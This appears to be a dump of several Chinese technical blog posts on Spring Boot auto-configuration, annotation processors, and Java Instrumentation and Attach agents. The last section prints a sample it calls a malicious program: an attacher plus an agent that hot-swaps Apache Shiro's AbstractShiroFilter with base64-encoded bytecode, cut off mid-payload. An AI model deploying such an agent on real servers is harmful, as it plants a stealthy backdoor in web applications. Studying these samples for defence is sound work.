27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  @ConditionalOnProperty(prefix = \u0026#34;springfox-swagger2\u0026#34;, name = \u0026#34;enabled\u0026#34;) @Configuration @EnableSwagger2 @EnableConfigurationProperties(SpringFoxSwagger2Prop.class) public class SpringFoxSwagger2AutoConfig { @Resource private SpringFoxSwagger2Prop springFoxSwagger2Prop; @Bean @ConditionalOnMissingBean public Docket docket() { ApiSelectorBuilder builder = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select(); List\u0026lt;String\u0026gt; excludedPaths = springFoxSwagger2Prop.getExcludedPaths(); if (excludedPaths == null || excludedPaths.isEmpty()) { builder.paths(Predicates.not(PathSelectors.regex(\u0026#34;/error\u0026#34;))) .paths(Predicates.not(PathSelectors.regex(\u0026#34;/actuator.*\u0026#34;))); } else { for (String path : excludedPaths) { builder.paths(Predicates.not(PathSelectors.regex(path))); } } return builder.build(); } private ApiInfo apiInfo() { SpringFoxSwagger2Prop.ApiInfo apiInfo = springFoxSwagger2Prop.getApiInfo(); if (apiInfo == null) { return ApiInfo.DEFAULT; } SpringFoxSwagger2Prop.Contact contact = apiInfo.getContact(); return new ApiInfo( apiInfo.getTitle(), apiInfo.getDescription(), apiInfo.getVersion(), apiInfo.getTermsOfServiceUrl(), new Contact(contact.getName(), contact.getUrl(), contact.getEmail()), apiInfo.getLicense(), apiInfo.getLicenseUrl(), Collections.emptyList() ); } }   SpringFoxSwagger2AutoConfig 的目的是创建 Docket 实例并交由 Spring IoC 容器管理，为了能够让 Spring Boot 采用这个自动配置类，应当在 springfox-swagger2-spring-boot-autoconfigure/src/main/resources/META-INF/spring.factories 文件里声明：\n1 2  org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\ io.h2cone.springfox.swagger2.spring.boot.autoconfigure.SpringFoxSwagger2AutoConfig   若有多个，则用逗号隔开，若需换行，则用反斜杠。值得注意的是，官方文档有一个小提示：\n Auto-configurations must be loaded that way only. Make sure that they are defined in a specific package space and that they are never the target of component scanning. Furthermore, auto-configuration classes should not enable component scanning to find additional components. Specific @Imports should be used instead.\n 特别是第三句，自动配置类不应启用组件扫描以查找其他组件，比如 @ComponentScan，应该使用指定的 @Imports 代替。一般情况下，自动配置类只能间接启用组件扫描，在自动配置类上声明导入了一些配置类（@Configuration），利用这些配置类可以启动组件扫描，查找标注了 @Component、@Controller、@Repository、@Service、@Aspect 等注解的类，除非，自定义注解、扫描、处理。\n以上代码来源于 springfox-swagger2-spring-boot，其中有如下三个模块:\n springfox-swagger2-spring-boot-autoconfigure springfox-swagger2-spring-boot-starter springfox-swagger2-spring-boot-sample  职责分别是自动配置、包装、示例。利用 Spring Boot 的自动配置特性，我们还可以提前创建好一组复杂单例，注册为 Spring Bean，通过 YML 配置和依赖注入来使用\u0026hellip;\u0026hellip;\n走马观花 以上经验告诉我们，Spring Boot 启动时会读取 META-INF/spring.factories 的元数据，加载类，进行自动配置。那我们就能通过 IntelliJ IDEA CE 强大的搜索功能发现加载此文件的类：\n进去阅读一下 org.springframework.core.io.support.SpringFactoriesLoader 的源码和 Javadoc，再利用 IntelliJ IDEA CE 代码分析能力得知 loadFactories 和 loadFactoryNames 这两个公共方法被 org.springframework.boot.autoconfigure.AutoConfigurationImportSelector 使用了。再来看看 AutoConfigurationImportSelector 的简介：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  /** * {@link DeferredImportSelector} to handle {@link EnableAutoConfiguration * auto-configuration}. This class can also be subclassed if a custom variant of * {@link EnableAutoConfiguration @EnableAutoConfiguration} is needed. * * @author Phillip Webb * @author Andy Wilkinson * @author Stephane Nicoll * @author Madhura Bhave * @since 1.3.0 * @see EnableAutoConfiguration */ public class AutoConfigurationImportSelector implements DeferredImportSelector, BeanClassLoaderAware, ResourceLoaderAware, BeanFactoryAware, EnvironmentAware, Ordered {   原来是处理 @EnableAutoConfiguration 注解的类。我想有人曾经对一般的 Spring Boot 程序的入口感到好奇：\n1 2 3 4 5 6 7 8  @SpringBootApplication public class SampleApplication { public static void main(String[] args) { SpringApplication.run(SampleApplication.class, args); } }   瞄了一下 @SpringBootApplication：\n1 2 3 4 5 6 7 8 9  @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(excludeFilters = { @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) }) public @interface SpringBootApplication {   当然，开启了自动配置。\n 本文首发于 https://h2cone.github.io\n 推荐阅读   Creating Your Own Auto-configuration\n  spring-boot-master-auto-configuration\n  mybatis/spring-boot-starter\n  dubbo-spring-boot-autoconfigure\n  grpc-spring-boot-starter\n  ","date":"2020-01-23T20:16:58+08:00","permalink":"https://h2cone.github.io/2020/01/23/your-own-spring-boot-starter/","title":"造你自己的 Spring Boot Starter 组件"},{"content":"为什么使用 Getter/Setter Java 的啰嗦和冗余是闻名于世的，特别在开发基于 Java 的业务系统的时候，继续不断地编写普通的 Java 类（数据类型），不假思索地用 private 修饰成员变量，熟练运用编辑器或集成开发环境不停地生成 Getter、Setter、ToString、Constructor 等方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  public class Member { public static final Logger log = LoggerFactory.getLogger(Member.class); private Long id; private String name; public Long getId() { return id; } public void setId(Long id) { this.id = id; } public String getName() { return name; } public void setName(String name) { this.name = name; } @Override public String toString() { return new StringJoiner(\u0026#34;, \u0026#34;, Member.class.getSimpleName() + \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;) .add(\u0026#34;id=\u0026#34; + id) .add(\u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#34;\u0026#39;\u0026#34;) .toString(); } }   如果被问到为什么怎么做，便美名其曰“面向对象编程”（不管重复多少遍，我都想回到过去抗议不翻译成对象导向编程的人）；为了诠释什么是 Java 对象，于是把对象三大特征给搬了出来：状态、标识、行为。\n   特征 解释     状态 数据类型的值   标识 内存地址   行为 数据类型的操作    再结合“面向对象编程”的三大特征：继承、多态、封装，特别指出封装（理直气壮，好像函数式编程不能封装似的），高谈阔论封装的好处，比如分离数据结构与其操作，提供 API，对使用者隐藏实现细节、隐藏数据的内部表示，非常利于维护、重用、单元测试，还不忘拾人牙慧，复读 David Wheeler 的话：\n All problems in computer science can be solved by another level of indirection.\n 计算机科学领域的任何问题都可以通过增加一个中间层来解决，Getter 和 Setter 就是封装形成的中间层（私有变量不能直接访问，只能通过中间层访问，不过该中间层往往非常浅薄），最后甩来一个链接：why-use-getters-and-setters-accessors。\nProject Lombok 用 private 修饰的字段和其 Getter/Settter 方法，既然已经成为约定俗成（若改用 public 修饰字段，可能成为”异类“），又或者这是库或框架的要求（我们不显式调用的方法，它们却很有可能需要隐式调用才能正常工作），或许还有其它理由，Java 程序员们需要不厌其烦去手动编写或静态生成那些刻板又繁多的代码，还好他们有化繁为简的神器，名为 Project Lombok：\n Project Lombok is a java library that automatically plugs into your editor and build tools, spicing up your java. Never write another getter or equals method again, with one annotation your class has a fully featured builder, Automate your logging variables, and much more.\n 若用 Lombok 简化前面的代码：\n1 2 3 4 5 6 7 8 9 10  @Slf4j @Getter @Setter @Accessors(chain = true) @ToString public class Member { private Long id; private String name; }   特地用 @Accessors(chain = true) 进行了增强，允许链式调用 Setter 方法创建对象（因为每次都返回 this）：\n1 2 3  Member member = new Member() .setId(0L) .setName(\u0026#34;lombok\u0026#34;);   创建一个复杂对象，主流的做法是使用建造者模式（Builder Pattern），只需要一个 @Builder 注解到类上，更多特色的注解在这里可以找到。\n注解 （Annotation）并不神奇，它们只是只读的元数据，程序读取它们，按我们的声明进行处理，我们可以偷看一下 @Slf4j 这个注解的类：\n1 2 3 4 5  @Retention(RetentionPolicy.SOURCE) @Target(ElementType.TYPE) public @interface Slf4j { String topic() default \u0026#34;\u0026#34;; }   @Retention 是一个元注解（注解的注解），其唯一属性的类型是 RetentionPolicy, 这个枚举只有三个：SOURCE、CLASS、RUNTIME，分别表示注解只保留到源文件，还是只保留到类文件，抑或是保留到运行时。由此可见，Lombok 的特色注解只保留到源文件，那么 Lombok 不是在运行时生成代码，而是在编译时生成代码（进一步证实是反编译有 Lombok 特色注解的源文件编译后的类文件）。\nAnnotation Processor 早在 Java 6 时期，开发人员就可以使用 Pluggable Annotation Processing API（JSR 269）定制注解处理器（Annotation Processor），处理源文件中的注解。比如，检查代码并发出自定义的错误或警告，就像 Java 编译器编译 Java 源文件时，它就会检查被 @Override 修饰的方法是否与父类或接口的方法签名相同，如果不同，就会报错（编译失败），又或者像 Lombok 那样，根据注解提供的信息在编译时修改代码（修改抽象语法树），而不会有运行时修改代码的开销。\n下面展示一个简单的注解处理器：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  @SupportedAnnotationTypes({ \u0026#34;io.h2cone.annotation.processor.Inspect\u0026#34; }) @SupportedSourceVersion(SourceVersion.RELEASE_8) public class SimpleAnnotationProcessor extends AbstractProcessor { @Override public boolean process(Set\u0026lt;? extends TypeElement\u0026gt; annotations, RoundEnvironment roundEnv) { for (TypeElement element : annotations) { this.processingEnv.getMessager().printMessage(Diagnostic.Kind.NOTE, element.getQualifiedName()); System.out.println(element.getQualifiedName()); } return false; } }   关键在于定制的注解处理器类需要继承 AbstractProcessor 类，并重写感兴趣的方法，去处理特定的注解，例如我们指定了一个自定义注解：\n1 2 3 4 5 6 7 8 9 10  @Retention(RetentionPolicy.SOURCE) @Target({ ElementType.TYPE, ElementType.METHOD }) public @interface Inspect { boolean ignore() default false; }   预期 process 方法会在编译时被调用，输出或打印传递而来的自定义注解的名称。可是其它项目如何使用定制的注解处理器？如果定制的注解处理器项目为 annotation-processor，那么它还需要一个文件（src/main/resources/META-INF/services/javax.annotation.processing.Processor）用来告诉编译器定制的注解处理器类在哪里：\n1  io.h2cone.annotation.processor.SimpleAnnotationProcessor   除此之外，构建此项目时应当添加编译参数 -proc:none，意味着无需注解处理即可进行编译（以 Maven 为例）：\n1 2 3 4 5 6 7 8 9 10 11  \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;compilerArgument\u0026gt;-proc:none\u0026lt;/compilerArgument\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt;   否者会编译失败，得到一个错误（error: Bad service configuration file）。\n假设准备使用定制的注解处理器的项目为 annotation-processor-demo，那么它只需添加依赖：\n1 2 3 4 5  \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.h2cone\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;annotation-processor\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${project.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt;   此依赖还包含了上面说到的自定义注解：\n1 2 3  @Inspect(ignore = true) public class Foobar { }   若使用 IntelliJ IDEA，依次点击 Build \u0026gt; Rebuild Project，成功后可以在底部的 Messages 看到 process 方法被调用从而输出了 Inspect 注解的名称：\n1  Information:java: io.h2cone.annotation.processor.Inspect    本文首发于 https://h2cone.github.io\n 参考资料   Java开发神器Lombok的使用与原理\n  Open JDK # Compilation Overview\n  【Lombok原理1】自定义注解处理器\n  Java Pluggable Annotation Processor\n  ","date":"2019-11-30T23:43:35+08:00","permalink":"https://h2cone.github.io/2019/11/30/annotation-processor/","title":"注解处理器"},{"content":"序言 什么情况下应该探测或追踪程序？应用程序无不例外可能存在运行时才暴露的 bug，生产环境的故障排除，不得不依靠读日志和 Review 代码，运气好的话也许只看异常栈和关键代码就能快速提出假设，在本地验证通过，修复后发布上线，最后还可能对先前测试不充分感到羞愧。很不幸，如果是底层或性能的疑难杂症，CPU、内存、I/O、进程、线程、堆、栈等都可能提供线索，它们在程序运行过程中动态变化，只有探测或追踪它们才能超越表面的代码观察，从而搜集下层行为数据以供分析，参与 debug 的程序员则如虎添翼。在 Java 平台，BTrace 非常适合动态追踪正在运行的程序，它的基础正是 Java Instrumention 和 Java Attach API。\nInstrument 简介 Oracle JDK 里有一个名为 java.lang.instrument 的包：\n Provides services that allow Java programming language agents to instrument programs running on the JVM. The mechanism for instrumentation is modification of the byte-codes of methods. [0]\n 从它的简介，我们可以确认的是 instrumentation 的机制是修改 Java 字节码，而且我们已经知道类文件包含字节码。不过等等，instrumentation 和 instrument 都是什么意思？在这里的 instrument，我暂时还找不到恰到好处的汉译，作动词时意为“给\u0026hellip;\u0026hellip;装测量仪器”或者“仪器化”，结合简介，此包允许 Java agent 给运行在 JVM 上的程序装测量仪器。Java agent 又是什么？它可以作为 Java 程序的探针，它本质上是一个 Jar 文件，它利用 Instrumentation 来更改已加载到 JVM 的类，例如往原类插入用于探测或追踪的代码，即所谓的埋点，它的底层实现依赖于 JVMTI (Java Virtual Machine Tool Interface)。\n In the context of computer programming, instrumentation refers to an ability to monitor or measure the level of a product\u0026rsquo;s performance, to diagnose errors, and to write trace information. [1]\n 上面这一段是 instrumentation 在维基百科的定义，instrumentation 是一种监控或测量应用程序性能，诊断错误以及写入跟踪信息的能力，此包当中的 java.lang.instrument.Instrumentation 接口，亦是如此：\n This class provides services needed to instrument Java programming language code. Instrumentation is the addition of byte-codes to methods for the purpose of gathering data to be utilized by tools. Since the changes are purely additive, these tools do not modify application state or behavior. Examples of such benign tools include monitoring agents, profilers, coverage analyzers, and event loggers. [2]\n 它被监控代理，分析器，覆盖率分析仪，事件记录器等工具所使用，诸如 jvisualvm、JProfiler、Arthas 等，这些工具通常不会改变目标程序的状态或行为。\n体验 如何以非侵入式测量 Java 方法执行耗时？你可能立马想到了操作字节码的库或框架，比如 JDK 动态代理、cglib、ASM、javassist、byte-buddy\u0026hellip;\u0026hellip;通过操作字节码在方法或代码块执行前后插入计时代码，但却极有可能需要手动更改原来的程序代码，例如添加依赖项以及新增切面类等等，既然如此，那就请 Java agent 帮忙吧。\n假设有一个 Cat 类，它有一些耗时方法，如下：\n1 2 3 4 5 6 7  public class Cat { public static void run() throws InterruptedException { System.out.println(\u0026#34;Cat is running\u0026#34;); Thread.sleep(RandomUtils.nextLong(3, 7)); } }   现在要利用 Java agent 测量 run 方法的执行时间，则需先构建 Java agent，因为它是 Jar 文件，要对被探测或追踪的程序起作用必然要先加载到 JVM，有两种方式，一是在 JVM 启动时通过命令行接口开启 agent；二是 JVM 启动后通过 Java Attach API 把 agent 附加到 JVM。\n首先以第一种方式来考虑 agent 类：\n1 2 3 4 5 6  public class ElapsedTimeAgent { public static void premain(String agentArgs, Instrumentation inst) { inst.addTransformer(new ElapsedTimeTransformer(agentArgs)); } }   此类实现了一个 premain 方法，它与我们常见的 main 方法相似，不仅都是作为执行的入口点，而且第一个方法参数的值来源于命令行，不过参数类型是字符串而不是字符串数组，命令行参数的解析交由用户实现；第二个参数类型是 Instrumentation，有两种获得其实例的方式：\n  当以指定了 Java agent 的方式启动 JVM，Instrumentation 实例将传递给 agent 类的 premain 方法。\n  当 Java agent 附加到启动后的 JVM，Instrumentation 实例将传递到 agent 类的 agentmain 方法。\n  这两种方式与加载 Java agent 的方式一一对应。Instrumentation 的 addTransformer 方法用于注册已提供的 transformer：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  public class ElapsedTimeTransformer implements ClassFileTransformer { private String agentArgs; public ElapsedTimeTransformer() { } public ElapsedTimeTransformer(String agentArgs) { this.agentArgs = agentArgs; } @Override public byte[] transform(ClassLoader loader, String className, Class\u0026lt;?\u0026gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { byte[] bytecode = classfileBuffer; if (className.equals(agentArgs)) { ClassPool classPool = ClassPool.getDefault(); try { CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer)); CtMethod[] methods = ctClass.getDeclaredMethods(); for (CtMethod method : methods) { method.addLocalVariable(\u0026#34;begin\u0026#34;, CtClass.longType); method.addLocalVariable(\u0026#34;end\u0026#34;, CtClass.longType); method.insertBefore(\u0026#34;begin = System.nanoTime();\u0026#34;); method.insertAfter(\u0026#34;end = System.nanoTime();\u0026#34;); String methodName = method.getLongName(); String x = \u0026#34;System.out.println(\\\u0026#34;\u0026#34; + methodName + \u0026#34;\\\u0026#34; + \\\u0026#34;: \\\u0026#34; + (end - begin) + \\\u0026#34; ns\\\u0026#34;\u0026#34; + \u0026#34;);\u0026#34;; method.insertAfter(x); } bytecode = ctClass.toBytecode(); ctClass.detach(); } catch (IOException | CannotCompileException e) { e.printStackTrace(); } } return bytecode; } }   重写 transform 方法允许我们用修改后的类代替原类并加载。具体实现是使用 javassist 的 API 去更改已加载类的字节码，在类方法体的开头和结尾分别插入获取当前的纳秒级时间戳语句，并在最后插入计算结果的打印语句，新类的字节码作为 transform 方法的返回值。transform 方法什么时候被调用？每一个新类被类加载器加载时。\n其次，新建 MANIFEST.MF 文件编写一些键值对告诉 JVM 这个 agent 类在哪里以及是否允许重定义类或重转换类：\n1 2 3 4  Manifest-Version: 1.0 Premain-Class: io.h2cone.trace.agent.ElapsedTimeAgent Can-Redefine-Classes: true Can-Retransform-Classes: true   再次，利用 Maven 插件构建 agent jar 文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-assembly-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.1\u0026lt;/version\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;phase\u0026gt;package\u0026lt;/phase\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;single\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;finalName\u0026gt;agent\u0026lt;/finalName\u0026gt; \u0026lt;archive\u0026gt; \u0026lt;manifestFile\u0026gt;src/main/resources/META-INF/MANIFEST.MF\u0026lt;/manifestFile\u0026gt; \u0026lt;/archive\u0026gt; \u0026lt;descriptorRefs\u0026gt; \u0026lt;descriptorRef\u0026gt;jar-with-dependencies\u0026lt;/descriptorRef\u0026gt; \u0026lt;/descriptorRefs\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt;   然后，给 Cat 类编写测试用的主类：\n1 2 3 4 5 6  public class CatMain { public static void main(String[] args) throws InterruptedException { Cat.run(); } }   并把两者构建成可执行且名为 app 的 jar 文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-shade-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;shade\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;finalName\u0026gt;app\u0026lt;/finalName\u0026gt; \u0026lt;shadedArtifactAttached\u0026gt;true\u0026lt;/shadedArtifactAttached\u0026gt; \u0026lt;transformers\u0026gt; \u0026lt;transformer implementation= \u0026#34;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer\u0026#34;\u0026gt; \u0026lt;mainClass\u0026gt;io.h2cone.inst.app.CatMain\u0026lt;/mainClass\u0026gt; \u0026lt;/transformer\u0026gt; \u0026lt;/transformers\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt;   最后，得到了 agent-jar-with-dependencies.jar 和 app.jar 后，查阅 Java agent 命令行接口文档：\n1  -javaagent:jarpath[=options]   jarpath 是 agent jar 文件的路径，可选的 options 能传递给 agent 类的 premain 方法，这里传递 Cat 类的命名：io/h2cone/inst/app/Cat，表示我们要测量它的方法执行时间：\n1  java -javaagent:agent-jar-with-dependencies.jar=io/h2cone/inst/app/Cat -jar app.jar   结果表明，不仅 Cat 类的 run 方法正常执行，而且输出了该方法的执行时间：\n1 2  Cat is running io.h2cone.inst.app.Cat.run(): 73993800 ns   完整代码已发布，请参考 inst-agent 和 inst-app。\nAttach 简述 翻阅 Oracle JDK 文档可以找到名为 com.sun.tools.attach 的包：\n Provides the API to attach to a Java virtual machine. [3]\n 在上一节，列出了加载 Java agent 的两种方式，第二种方式使用 Attach API，把 Java agent 附加到启动后的 JVM，采用这种方式无需重启 JVM。Attach 是如何实现的呢？初步大胆猜想，利用 Attach API 编写而成的程序与目标 JVM 进行了线程间通信，传输 Java agent 并装载到目标 JVM。\n 跟踪程序通过 Unix Domain Socket 与目标 JVM 的 Attach Listener 线程进行交互。[4]\n 例子 编写一只可以持续汪汪叫的小狗：\n1 2 3 4 5 6 7 8 9 10 11  public class DogMain { public static void main(String[] args) throws InterruptedException { String name = ManagementFactory.getRuntimeMXBean().getName(); System.out.printf(\u0026#34;managed bean name: %s\\n\u0026#34;, name); while (true) { Thread.sleep(10000); CompletableFuture.runAsync(() -\u0026gt; System.out.println(\u0026#34;Woof Woof\u0026#34;)); } } }   这个程序跑起来后 20 秒内输出：\n1 2  managed bean name: 5424@borvino Woof Woof   注意 managed bean name 的值为 5424@borvino，当中的 5424 就是这个进程的 PID。\n方便起见，编写简易的 agent 类：\n1 2 3 4 5 6 7 8 9 10 11 12  public class OwnerAgent { public static void agentmain(String agentArgs, Instrumentation inst) throws Exception { System.out.println(\u0026#34;agentmain agentArgs: \u0026#34; + agentArgs); System.out.println(\u0026#34;agentmain inst: \u0026#34; + inst); } public static void premain(String agentArgs, Instrumentation inst) throws Exception { System.out.println(\u0026#34;premain agentArgs: \u0026#34; + agentArgs); System.out.println(\u0026#34;premain inst: \u0026#34; + inst); } }   回想前文所说的获取 Instrumentation 实例的两种方式，当把 Java agent 附加到 JVM 时，Instrumentation 实例将传递到 agent 类的 agentmain 方法，也是就说 agentmain 将会被调用。\n不忘编写 MANIFEST.MF 文件：\n1 2 3 4 5  Manifest-Version: 1.0 Premain-Class: io.h2cone.attach.agent.OwnerAgent Agent-Class: io.h2cone.attach.agent.OwnerAgent Can-Redefine-Classes: true Can-Retransform-Classes: true   既声明 Agent-Class 也声明 Premain-Class，OwnerAgent 类同时满足两种方式所要求的方法签名。\n与上文相似，打包好 agent.jar 后，方便起见，直接用 IDE 启动 DogMain，从控制台读取目标 JVM 的 PID，万事俱备，首先依附到 JVM，然后动态加载 agent 到 JVM，最后分离：\n1 2 3 4 5 6 7 8 9 10  @Test public void attach() throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { String pid = \u0026#34;pid\u0026#34;; // 目标 JVM 的 PID  VirtualMachine vm = VirtualMachine.attach(pid); String agentJarPath = \u0026#34;path to agent.jar\u0026#34;; // agent.jar 文件的路径  String options = \u0026#34;Hello, Dog\u0026#34;; vm.loadAgent(agentJarPath, options); vm.detach(); }   试验结果：\n1 2 3 4 5 6  managed bean name: 5424@borvino Woof Woof agentmain agentArgs: Hello, Dog agentmain inst: sun.instrument.InstrumentationImpl@4c4744d8 Woof Woof Woof Woof   OwnerAgent 类的 agentmain 方法被调用，DogMain 的 main 方法也正常执行。\n完整代码已发布，请参考 attach-agent 和 attach-app。\n恶意程序 Test.class：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  public class Test { public static void main(String[] paramArrayOfString) throws AgentLoadException, AgentInitializationException, IOException, AttachNotSupportedException { attach(paramArrayOfString[0]); } public static void attach(String paramString) throws AgentLoadException, AgentInitializationException, IOException, AttachNotSupportedException { String str1 = paramString; String str2 = (new File(\u0026#34;agent.jar\u0026#34;)).getAbsolutePath(); System.out.println(\u0026#34;attaching....pid=\u0026#34; + str1); VirtualMachine virtualMachine = VirtualMachine.attach(str1); virtualMachine.loadAgent(str2, null); virtualMachine.detach(); } }   agent.jar/HotSwapAgent.class：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  public class HotSwapAgent { public static void premain(String paramString, Instrumentation paramInstrumentation) {} public static void agentmain(String paramString, Instrumentation paramInstrumentation) { try { Class[] arrayOfClass = paramInstrumentation.getAllLoadedClasses(); for (Class\u0026lt;?\u0026gt; clazz : arrayOfClass) { if (clazz.getName().equals(\u0026#34;org.apache.shiro.web.servlet.AbstractShiroFilter\u0026#34;)) { System.out.println(clazz.getName()); byte[] arrayOfByte = (new BASE64Decoder()).decodeBuffer(\u0026#34;yv66vgAAADIBbQoAYgCvCQBgALAJAGAAsQkAYACyCgBgALMKAGAAtAoAYAC1CgBgALYKAGAAtwoAuAC5CABuCgBgALoKALsAvAoAuwC9CgBgAL4JAGAAvwgAwAsAwQDCCgBgAMMKAGAAxAcAxQoAFQCvCwDGAMcHAMgKAGAAyQoAYADKCgAYAMsHAMwKAGAAzQcAzgoAHgDPBwDQCgBgANEHANMKACIA1QoAIgDWCgC4ANcLANgA2QsA2gDbBwDcCADdCwDBAN4JAN8A4AoA4QDiCADjCwAcAOQIAOUKAN8A5goANADnCADoCgA0AOkHAOoIAOsIAOwIAO0IAO4HAO8KADkA8AoAOQDxCgA5APIKAPMA9AcA9QoAPgCvCgD2APcKAD4A+AoAPgD5BwD6CwAgAPsKAEMA/AoAPgD9CgA0AP4KAEMA/woAQwD5CgBDAQAKAGABAQoAYAECCgBgAQMHAQQKAE4BBQsA2AEGBwEHCgBRAQgHAQkHAQoIAQsKAFMBDAoAYAENCAEOCwDBAQ8LARABEQgBEgsAwQETCAEUCgBgARULARYBFwcBGAoBGQEaBwEbAQAAAQAMSW5uZXJDbGFzc2VzAQADbG9nAQASTG9yZy9zbGY0ai9Mb2dnZXI7AQAWU1RBVElDX0lOSVRfUEFSQU1fTkFNRQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADUNvbnN0YW50VmFsdWUBAA9zZWN1cml0eU1hbmFnZXIBAC1Mb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjsBABNmaWx0ZXJDaGFpblJlc29sdmVyAQA1TG9yZy9hcGFjaGUvc2hpcm8vd2ViL2ZpbHRlci9tZ3QvRmlsdGVyQ2hhaW5SZXNvbHZlcjsBABxzdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQABWgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJnZXRTZWN1cml0eU1hbmFnZXIBAC8oKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9tZ3QvV2ViU2VjdXJpdHlNYW5hZ2VyOwEAEnNldFNlY3VyaXR5TWFuYWdlcgEAMChMb3JnL2FwYWNoZS9zaGlyby93ZWIvbWd0L1dlYlNlY3VyaXR5TWFuYWdlcjspVgEAFmdldEZpbHRlckNoYWluUmVzb2x2ZXIBADcoKUxvcmcvYXBhY2hlL3NoaXJvL3dlYi9maWx0ZXIvbWd0L0ZpbHRlckNoYWluUmVzb2x2ZXI7AQAWc2V0RmlsdGVyQ2hhaW5SZXNvbHZlcgEAOChMb3JnL2FwYWNoZS9zaGlyby93ZWIvZmlsdGVyL21ndC9GaWx0ZXJDaGFpblJlc29sdmVyOylWAQAeaXNTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkAQADKClaAQAfc2V0U3RhdGljU2VjdXJpdHlNYW5hZ2VyRW5hYmxlZAEABChaKVYBABFvbkZpbHRlckNvbmZpZ1NldAEADVN0YWNrTWFwVGFibGUBAApFeGNlcHRpb25zBwEcAQAnYXBwbHlTdGF0aWNTZWN1cml0eU1hbmFnZXJFbmFibGVkQ29uZmlnBwDqAQAEaW5pdAEAFWVuc3VyZVNlY3VyaXR5TWFuYWdlcgcBHQEAHGNyZWF0ZURlZmF1bHRTZWN1cml0eU1hbmFnZXIBAA5pc0h0dHBTZXNzaW9ucwEAEndyYXBTZXJ2bGV0UmVxdWVzdAEARyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAVcHJlcGFyZVNlcnZsZXRSZXF1ZXN0AQB4KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7BwEeAQATd3JhcFNlcnZsZXRSZXNwb25zZQEAfyhMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvU2hpcm9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBABZwcmVwYXJlU2VydmxldFJlc3BvbnNlAQB5KExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqY